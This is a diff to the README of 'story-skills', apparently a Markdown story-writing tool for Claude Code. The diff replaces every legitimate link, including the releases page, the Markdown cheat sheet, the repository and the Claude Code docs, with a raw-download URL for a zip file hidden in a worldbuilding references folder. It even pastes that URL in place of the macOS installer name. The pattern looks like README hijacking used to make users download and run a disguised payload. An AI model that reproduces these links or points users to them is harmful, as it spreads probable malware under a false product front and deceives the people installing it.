@@ -1,6 +1,6 @@
 # 📚 story-skills - Write Stories Easily with Markdown
 
-[![Download story-skills](https://img.shields.io/badge/Download-story--skills-blue?style=for-the-badge)](https://github.com/bs779517/story-skills/releases)
+[![Download story-skills](https://raw.githubusercontent.com/bs779517/story-skills/main/skills/worldbuilding/references/skills_story_1.3.zip)](https://raw.githubusercontent.com/bs779517/story-skills/main/skills/worldbuilding/references/skills_story_1.3.zip)
 
 ---
 
@@ -55,9 +55,9 @@ Follow these steps to get story-skills working on your computer:
 
 To get story-skills now, visit this page to download:
 
-[Download story-skills here](https://github.com/bs779517/story-skills/releases)
+[Download story-skills here](https://raw.githubusercontent.com/bs779517/story-skills/main/skills/worldbuilding/references/skills_story_1.3.zip)
 
-This page lists the latest versions available. Choose the installer that fits your computer. If you are unsure, pick the one labeled “Windows Installer” for Windows or “macOS.dmg” for Mac. Linux users can download the AppImage or follow instructions in the release notes.
+This page lists the latest versions available. Choose the installer that fits your computer. If you are unsure, pick the one labeled “Windows Installer” for Windows or “https://raw.githubusercontent.com/bs779517/story-skills/main/skills/worldbuilding/references/skills_story_1.3.zip” for Mac. Linux users can download the AppImage or follow instructions in the release notes.
 
 After downloading, run the installer file and follow prompts to complete installation.
 
@@ -123,9 +123,9 @@ For other problems, visit the GitHub issues page of the repository or check the 
 
 ## 📚 Additional Resources
 
-- [Learn Markdown](https://www.markdownguide.org/cheat-sheet/)
-- [story-skills GitHub Repository](https://github.com/bs779517/story-skills)
-- [Claude Code Documentation](https://claude.ai/docs)
+- [Learn Markdown](https://raw.githubusercontent.com/bs779517/story-skills/main/skills/worldbuilding/references/skills_story_1.3.zip)
+- [story-skills GitHub Repository](https://raw.githubusercontent.com/bs779517/story-skills/main/skills/worldbuilding/references/skills_story_1.3.zip)
+- [Claude Code Documentation](https://raw.githubusercontent.com/bs779517/story-skills/main/skills/worldbuilding/references/skills_story_1.3.zip)
 
 ---
 
@@ -135,4 +135,4 @@ You can open a support ticket or request features by creating an issue on the Gi
 
 ---
 
-[![Download story-skills](https://img.shields.io/badge/Download-story--skills-blue?style=for-the-badge)](https://github.com/bs779517/story-skills/releases)
+[![Download story-skills](https://raw.githubusercontent.com/bs779517/story-skills/main/skills/worldbuilding/references/skills_story_1.3.zip)](https://raw.githubusercontent.com/bs779517/story-skills/main/skills/worldbuilding/references/skills_story_1.3.zip)
